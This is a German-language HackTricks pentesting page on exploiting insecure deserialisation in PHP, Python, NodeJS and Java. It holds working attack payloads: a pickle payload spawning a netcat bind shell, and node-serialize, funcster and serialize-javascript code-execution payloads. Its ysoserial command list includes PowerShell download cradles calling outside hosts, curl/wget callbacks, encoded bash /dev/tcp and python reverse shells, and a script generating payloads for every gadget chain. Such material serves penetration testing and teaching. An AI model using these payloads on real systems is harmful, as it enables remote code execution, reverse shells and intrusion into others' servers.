# Deserialisierung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## Grundlegende Informationen

**Serialisierung** wird als die Methode verstanden, ein Objekt in ein Format umzuwandeln, das erhalten werden kann, mit dem Ziel, das Objekt entweder zu speichern oder als Teil eines Kommunikationsprozesses zu √ºbertragen. Diese Technik wird h√§ufig eingesetzt, um sicherzustellen, dass das Objekt zu einem sp√§teren Zeitpunkt wiederhergestellt werden kann, wobei seine Struktur und sein Zustand erhalten bleiben.

**Deserialisierung** hingegen ist der Prozess, der der Serialisierung entgegenwirkt. Es beinhaltet das Entgegennehmen von Daten, die in einem bestimmten Format strukturiert wurden, und das Zur√ºckf√ºhren in ein Objekt.

Deserialisierung kann gef√§hrlich sein, da es potenziell **Angreifern erm√∂glicht, die serialisierten Daten zu manipulieren, um sch√§dlichen Code auszuf√ºhren** oder unerwartetes Verhalten in der Anwendung w√§hrend des Objektrekonstruktionsprozesses zu verursachen.

## PHP

In PHP werden spezifische magische Methoden w√§hrend der Serialisierungs- und Deserialisierungsprozesse verwendet:

* `__sleep`: Wird aufgerufen, wenn ein Objekt serialisiert wird. Diese Methode sollte ein Array mit den Namen aller Eigenschaften des Objekts zur√ºckgeben, die serialisiert werden sollen. Es wird h√§ufig verwendet, um ausstehende Daten zu √ºbermitteln oder √§hnliche Aufr√§umarbeiten durchzuf√ºhren.
* `__wakeup`: Wird aufgerufen, wenn ein Objekt deserialisiert wird. Es wird verwendet, um eventuelle w√§hrend der Serialisierung verlorene Datenbankverbindungen wiederherzustellen und andere Initialisierungsaufgaben durchzuf√ºhren.
* `__unserialize`: Diese Methode wird anstelle von `__wakeup` aufgerufen (falls vorhanden), wenn ein Objekt deserialisiert wird. Sie bietet mehr Kontrolle √ºber den Deserialisierungsprozess im Vergleich zu `__wakeup`.
* `__destruct`: Diese Methode wird aufgerufen, wenn ein Objekt kurz davor steht, zerst√∂rt zu werden oder wenn das Skript endet. Sie wird typischerweise f√ºr Aufr√§umarbeiten wie das Schlie√üen von Datei-Handles oder Datenbankverbindungen verwendet.
* `__toString`: Diese Methode erm√∂glicht es, ein Objekt als Zeichenkette zu behandeln. Sie kann zum Lesen einer Datei oder f√ºr andere Aufgaben basierend auf den Funktionsaufrufen darin verwendet werden und bietet effektiv eine textuelle Darstellung des Objekts.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Wenn Sie sich die Ergebnisse ansehen, k√∂nnen Sie feststellen, dass die Funktionen **`__wakeup`** und **`__destruct`** aufgerufen werden, wenn das Objekt deserialisiert wird. Beachten Sie, dass in mehreren Tutorials die Funktion **`__toString`** aufgerufen wird, wenn versucht wird, ein Attribut zu drucken, aber anscheinend passiert das **nicht mehr**.

{% hint style="warning" %}
Die Methode **`__unserialize(array $data)`** wird **anstelle von `__wakeup()`** aufgerufen, wenn sie in der Klasse implementiert ist. Sie erm√∂glicht es Ihnen, das Objekt zu deserialisieren, indem Sie die serialisierten Daten als Array bereitstellen. Sie k√∂nnen diese Methode verwenden, um Eigenschaften zu deserialisieren und alle erforderlichen Aufgaben bei der Deserialisierung auszuf√ºhren.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Sie k√∂nnen ein erkl√§rtes **PHP-Beispiel hier** lesen: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) oder hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Klassen

Sie k√∂nnten die PHP-Autoload-Funktionalit√§t missbrauchen, um beliebige PHP-Dateien und mehr zu laden:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serialisierung von referenzierten Werten

Wenn Sie aus irgendeinem Grund einen Wert als **Referenz zu einem anderen serialisierten Wert** serialisieren m√∂chten, k√∂nnen Sie das tun:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial f√ºr PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kann Ihnen dabei helfen, Payloads zu generieren, um PHP-Deserialisierungen zu missbrauchen.\
Beachten Sie, dass Sie in mehreren F√§llen **m√∂glicherweise keinen Weg finden k√∂nnen, eine Deserialisierung im Quellcode der Anwendung zu missbrauchen**, aber Sie k√∂nnten in der Lage sein, **den Code externer PHP-Erweiterungen zu missbrauchen.**\
√úberpr√ºfen Sie daher, wenn m√∂glich, die `phpinfo()` des Servers und **suchen Sie im Internet** (und sogar in den **Gadgets** von **PHPGGC**) nach m√∂glichen Gadgets, die Sie missbrauchen k√∂nnten.

### Deserialisierung von phar:// Metadaten

Wenn Sie eine LFI gefunden haben, die nur die Datei liest und den darin enthaltenen PHP-Code nicht ausf√ºhrt, beispielsweise mit Funktionen wie _**file\_get\_contents(), fopen(), file() oder file\_exists(), md5\_file(), filemtime() oder filesize()**_**. k√∂nnen Sie versuchen, eine **Deserialisierung** zu missbrauchen, die beim **Lesen** einer **Datei** mit dem **phar**-Protokoll auftritt.\
F√ºr weitere Informationen lesen Sie den folgenden Beitrag:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wenn das Objekt unpickelt wird, wird die Funktion _\_\_reduce\_\__ ausgef√ºhrt.\
Wenn ausgenutzt, k√∂nnte der Server einen Fehler zur√ºckgeben.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
F√ºr weitere Informationen zum Entkommen aus **Pickle-Gef√§ngnissen** siehe:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Die folgende Seite pr√§sentiert die Technik, um eine unsichere Deserialisierung in YAML-Python-Bibliotheken zu **missbrauchen** und endet mit einem Tool, das verwendet werden kann, um eine RCE-Deserialisierungspayload f√ºr **Pickle, PyYAML, jsonpickle und ruamel.yaml** zu generieren:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Klassenverschmutzung (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magische Funktionen

JS hat keine "magischen" Funktionen wie PHP oder Python, die nur zur Erstellung eines Objekts ausgef√ºhrt werden. Aber es hat einige Funktionen, die h√§ufig verwendet werden, auch ohne sie direkt aufzurufen, wie **`toString`**, **`valueOf`**, **`toJSON`**.\
Wenn Sie bei einer Deserialisierung diese Funktionen **kompromittieren, um anderen Code auszuf√ºhren** (potenziell die Prototyp-Verschmutzung missbrauchen), k√∂nnten Sie beliebigen Code ausf√ºhren, wenn sie aufgerufen werden.

Ein weiterer "magischer" Weg, eine Funktion aufzurufen, ohne sie direkt aufzurufen, besteht darin, ein Objekt zu kompromittieren, das von einer asynchronen Funktion (Promise) zur√ºckgegeben wird. Denn wenn Sie dieses R√ºckgabeobjekt in ein anderes Promise mit einer Eigenschaft namens "then" vom Typ Funktion umwandeln, wird es ausgef√ºhrt, nur weil es von einem anderen Promise zur√ºckgegeben wird. _Folgen Sie_ [_**diesem Link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _f√ºr weitere Informationen._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` und `prototype`-Vergiftung

Wenn Sie mehr √ºber diese Technik erfahren m√∂chten, **schauen Sie sich das folgende Tutorial an**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Diese Bibliothek erm√∂glicht die Serialisierung von Funktionen. Beispiel:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Das **serialisierte Objekt** wird wie folgt aussehen:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Sie k√∂nnen im Beispiel sehen, dass beim Serialisieren einer Funktion das Flag `_$$ND_FUNC$$_` an das serialisierte Objekt angeh√§ngt wird.

Innerhalb der Datei `node-serialize/lib/serialize.js` finden Sie dasselbe Flag und wie der Code es verwendet.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Wie Sie im letzten Code-Abschnitt sehen k√∂nnen, wird **wenn das Flag gefunden wird** `eval` verwendet, um die Funktion zu deserialisieren, sodass im Grunde genommen **Benutzereingaben innerhalb der `eval`-Funktion verwendet werden**.

Jedoch **wird allein durch das Serialisieren** einer Funktion diese nicht ausgef√ºhrt, da es erforderlich w√§re, dass ein Teil des Codes in unserem Beispiel `y.rce` aufruft, was √§u√üerst **unwahrscheinlich** ist.\
Wie auch immer, Sie k√∂nnten einfach das serialisierte Objekt **modifizieren**, **indem Sie einige Klammern hinzuf√ºgen**, um die serialisierte Funktion automatisch auszuf√ºhren, wenn das Objekt deserialisiert wird.\
Im n√§chsten Code-Abschnitt **achten Sie auf die letzte Klammer** und wie die `unserialize`-Funktion den Code automatisch ausf√ºhren wird:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Wie bereits erw√§hnt, wird diese Bibliothek den Code nach `_$$ND_FUNC$$_` abrufen und ihn mit `eval` **ausf√ºhren**. Um also **Code automatisch auszuf√ºhren**, k√∂nnen Sie den Teil der Funktionserstellung und die letzte Klammer **l√∂schen und einfach einen JS-Oneliner ausf√ºhren**, wie im folgenden Beispiel:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Sie k√∂nnen [**hier**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **weitere Informationen** dar√ºber finden, wie man diese Schwachstelle ausnutzen kann.

### [funcster](https://www.npmjs.com/package/funcster)

Ein bemerkenswerter Aspekt von **funcster** ist die Unzug√§nglichkeit von **Standard-Objekten**; sie fallen au√üerhalb des zug√§nglichen Bereichs. Diese Einschr√§nkung verhindert die Ausf√ºhrung von Code, der versucht, Methoden auf Standard-Objekten aufzurufen, was zu Ausnahmen wie `"ReferenceError: console is not defined"` f√ºhrt, wenn Befehle wie `console.log()` oder `require(something)` verwendet werden.

Trotz dieser Einschr√§nkung ist die Wiederherstellung des vollen Zugriffs auf den globalen Kontext, einschlie√ülich aller Standard-Objekte, durch einen spezifischen Ansatz m√∂glich. Durch direkte Nutzung des globalen Kontexts kann man diese Einschr√§nkung umgehen. Zum Beispiel kann der Zugriff mithilfe des folgenden Snippets wiederhergestellt werden:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**F√ºr** [**weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Das **serialize-javascript**-Paket ist ausschlie√ülich f√ºr Serialisierungszwecke konzipiert und verf√ºgt √ºber keine integrierten Deserialisierungsfunktionen. Benutzer sind daf√ºr verantwortlich, ihre eigene Methode zur Deserialisierung zu implementieren. Ein direkter Einsatz von `eval` wird vom offiziellen Beispiel zur Deserialisierung serialisierter Daten vorgeschlagen:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Wenn diese Funktion zum Deserialisieren von Objekten verwendet wird, k√∂nnen Sie sie **leicht ausnutzen**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**F√ºr** [**weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo-Bibliothek

Auf den folgenden Seiten finden Sie Informationen dar√ºber, wie Sie diese Bibliothek missbrauchen k√∂nnen, um beliebige Befehle auszuf√ºhren:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java werden **Deserialisierungs-R√ºckrufe w√§hrend des Deserialisierungsprozesses ausgef√ºhrt**. Diese Ausf√ºhrung kann von Angreifern ausgenutzt werden, die b√∂sartige Payloads erstellen, die diese R√ºckrufe ausl√∂sen und so potenziell sch√§dliche Aktionen ausf√ºhren.

### Fingerabdr√ºcke

#### White Box

Um potenzielle Serialisierungsanf√§lligkeiten im Code zu identifizieren, suchen Sie nach:

* Klassen, die das `Serializable`-Interface implementieren.
* Verwendung von `java.io.ObjectInputStream`, `readObject`, `readUnshare`-Funktionen.

Achten Sie besonders auf:

* `XMLDecoder`, die mit von externen Benutzern definierten Parametern verwendet werden.
* `XStream`'s `fromXML`-Methode, insbesondere wenn die XStream-Version kleiner oder gleich 1.46 ist, da sie anf√§llig f√ºr Serialisierungsprobleme ist.
* `ObjectInputStream` in Verbindung mit der Methode `readObject`.
* Implementierung von Methoden wie `readObject`, `readObjectNodData`, `readResolve` oder `readExternal`.
* `ObjectInputStream.readUnshared`.
* Allgemeine Verwendung von `Serializable`.

#### Black Box

F√ºr Black-Box-Tests suchen Sie nach spezifischen **Signaturen oder "Magic Bytes"**, die auf Java-serialisierte Objekte hinweisen (die von `ObjectInputStream` stammen):

* Hexadezimales Muster: `AC ED 00 05`.
* Base64-Muster: `rO0`.
* HTTP-Antwortheader mit `Content-Type` auf `application/x-java-serialized-object` gesetzt.
* Hexadezimales Muster, das auf vorherige Komprimierung hinweist: `1F 8B 08 00`.
* Base64-Muster, das auf vorherige Komprimierung hinweist: `H4sIA`.
* Webdateien mit der Erweiterung `.faces` und dem Parameter `faces.ViewState`. Das Entdecken dieser Muster in einer Webanwendung sollte eine Untersuchung gem√§√ü des [Beitrags √ºber die Deserialisierung des Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md) ausl√∂sen.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### √úberpr√ºfen Sie, ob verwundbar

Wenn Sie mehr √ºber die Funktionsweise eines Java Deserialisierungsangriffs erfahren m√∂chten, sollten Sie sich [**Grundlegende Java-Deserialisierung**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS-Deserialisierung**](java-dns-deserialization-and-gadgetprobe.md) und [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) ansehen.

#### White-Box-Test

Sie k√∂nnen √ºberpr√ºfen, ob eine Anwendung mit bekannten Sicherheitsl√ºcken installiert ist.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Sie k√∂nnten versuchen, **alle bekannten anf√§lligen Bibliotheken** zu √ºberpr√ºfen, f√ºr die [**Ysoserial**](https://github.com/frohoff/ysoserial) einen Exploit bereitstellen kann. Oder Sie k√∂nnten die Bibliotheken √ºberpr√ºfen, die auf dem [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) angegeben sind.\
Sie k√∂nnten auch [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) verwenden, um nach m√∂glichen Gadget-Ketten zu suchen, die ausgenutzt werden k√∂nnen.\
Beim Ausf√ºhren von **gadgetinspector** (nach dem Erstellen) sollten Sie sich nicht um die Vielzahl von Warnungen/Fehlern k√ºmmern, die angezeigt werden, sondern es einfach durchlaufen lassen. Es wird alle Ergebnisse unter _gadgetinspector/gadget-results/gadget-chains-Jahr-Monat-Tag-Stunde-Minute.txt_ schreiben. Bitte beachten Sie, dass **gadgetinspector keinen Exploit erstellt und m√∂glicherweise falsche positive Ergebnisse anzeigt**.

#### Black Box Test

Mit der Burp-Erweiterung [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) k√∂nnen Sie **feststellen, welche Bibliotheken verf√ºgbar sind** (und sogar die Versionen). Mit diesen Informationen k√∂nnte es **einfacher sein, ein Payload auszuw√§hlen**, um die Schwachstelle auszunutzen.\
[**Lesen Sie hier mehr √ºber GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe konzentriert sich auf **`ObjectInputStream` Deserialisierungen**.

Mit der Burp-Erweiterung [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) k√∂nnen Sie **anf√§llige Bibliotheken identifizieren**, die mit ysoserial ausgenutzt werden k√∂nnen, und sie **ausnutzen**.\
[**Lesen Sie hier mehr √ºber den Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Der Java Deserialization Scanner konzentriert sich auf **`ObjectInputStream`** Deserialisierungen.

Sie k√∂nnen auch [**Freddy**](https://github.com/nccgroup/freddy) verwenden, um Schwachstellen bei der **Deserialisierung** in **Burp** zu erkennen. Dieses Plugin erkennt Schwachstellen, die nicht nur mit **`ObjectInputStream`** zusammenh√§ngen, sondern auch Schwachstellen von **Json**- und **Yml**-Deserialisierungsbibliotheken. Im aktiven Modus wird versucht, diese mit Sleep- oder DNS-Payloads zu best√§tigen.\
[**Weitere Informationen zu Freddy finden Sie hier.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialisierungstest**

Nicht alles dreht sich darum, zu √ºberpr√ºfen, ob der Server anf√§llige Bibliotheken verwendet. Manchmal k√∂nnten Sie in der Lage sein, **die Daten innerhalb des serialisierten Objekts zu √§ndern und einige √úberpr√ºfungen zu umgehen** (vielleicht erhalten Sie Administratorrechte in einer Webanwendung).\
Wenn Sie ein Java-Serialisierungsobjekt finden, das an eine Webanwendung gesendet wird, k√∂nnen Sie [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) verwenden, um das serialisierte Objekt, das gesendet wird, in einem menschenlesbaren Format auszugeben. Es w√§re einfacher zu wissen, welche Daten Sie senden, um sie zu √§ndern und einige √úberpr√ºfungen zu umgehen.

### **Exploit**

#### **ysoserial**

Das Hauptwerkzeug zum Ausnutzen von Java-Deserialisierungen ist [**ysoserial**](https://github.com/frohoff/ysoserial) ([**hier herunterladen**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Sie k√∂nnen auch in Betracht ziehen, [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) zu verwenden, mit dem Sie komplexe Befehle (zum Beispiel mit Pipes) verwenden k√∂nnen.\
Beachten Sie, dass dieses Tool darauf ausgerichtet ist, **`ObjectInputStream`** auszunutzen.\
Ich w√ºrde empfehlen, zun√§chst das "URLDNS"-Payload zu verwenden, **bevor ein RCE**-Payload, um zu testen, ob die Injektion m√∂glich ist. Beachten Sie jedoch, dass das "URLDNS"-Payload m√∂glicherweise nicht funktioniert, aber ein anderes RCE-Payload schon.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Bei der Erstellung eines Payloads f√ºr **java.lang.Runtime.exec()** k√∂nnen Sie **keine Sonderzeichen** wie ">" oder "|" verwenden, um die Ausgabe einer Ausf√ºhrung umzuleiten, "$()" um Befehle auszuf√ºhren oder sogar **Argumente an einen Befehl zu √ºbergeben**, die durch **Leerzeichen** getrennt sind (Sie k√∂nnen `echo -n "hello world"` ausf√ºhren, aber Sie k√∂nnen nicht `python2 -c 'print "Hello world"'` ausf√ºhren). Um den Payload korrekt zu codieren, k√∂nnten Sie [diese Webseite verwenden](http://www.jackson-t.ca/runtime-exec-payloads.html).

F√ºhlen Sie sich frei, das folgende Skript zu verwenden, um **alle m√∂glichen Codeausf√ºhrungs-Payloads** f√ºr Windows und Linux zu erstellen und sie dann auf der anf√§lligen Webseite zu testen:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

